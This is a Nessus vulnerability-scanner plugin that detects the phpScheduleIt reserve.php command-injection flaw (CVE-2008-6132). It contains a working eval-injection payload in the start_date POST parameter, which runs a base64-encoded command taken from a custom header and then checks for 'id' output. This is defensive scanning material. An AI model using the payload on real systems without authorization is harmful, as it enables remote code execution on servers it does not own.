#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
  script_id(34338);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2008-6132");
  script_bugtraq_id(31520, 33855);
  script_xref(name:"milw0rm", value:"6646");
  script_xref(name:"OSVDB", value:"48797");

  script_name(english:"phpScheduleIt reserve.php start_date Parameter Arbitrary Command Injection");
  script_summary(english:"Tries to run a command using phpScheduleIt");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows execution
of arbitrary commands." );
 script_set_attribute(attribute:"description", value:
"The version of phpScheduleIt installed on the remote host fails to
sanitize user-supplied input to the 'start_date' parameter of the
'reserve.php' script before using it in an 'eval()' function call. 
Provided PHP's 'magic_quotes_gpc' is disabled, an unauthenticated
remote attacker can leverage this issue to execute arbitrary code on
the remote host, subject to the privileges under which the web server
operates." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f01c512f" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpScheduleIt version 1.2.11 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("phpscheduleit_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";


# Test an install.
install = get_kb_item(string("www/", port, "/phpscheduleit"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/reserve.php");

  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("return check_reservation_form" >< res)
  {
    # Try to exploit the flaw to run a command.
    var = string("NESSUS_", toupper(rand_str()));
    postdata = string(
      "btnSubmit=1&",
      "start_date=1').${passthru(base64_decode($_SERVER[HTTP_", var, "]))}.${die};#"
    );

    r = http_send_recv3(method: "POST ", item: url, version: 11, port: port,
      add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded",
      		   		"Referer", build_url(port:port, qs:url),
				var, base64(str:cmd)),
	data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    lines = egrep(pattern:cmd_pat, string:res);
    if (lines)
    {
      if (report_verbosity)
      {
        output = "";
        foreach line (split(lines))
          output += ereg_replace(pattern:'^[ \t]*', replace:"  ", string:line);

        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote\n",
          "host to produce the following results :\n",
          "\n",
          output
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
    }
  }
}
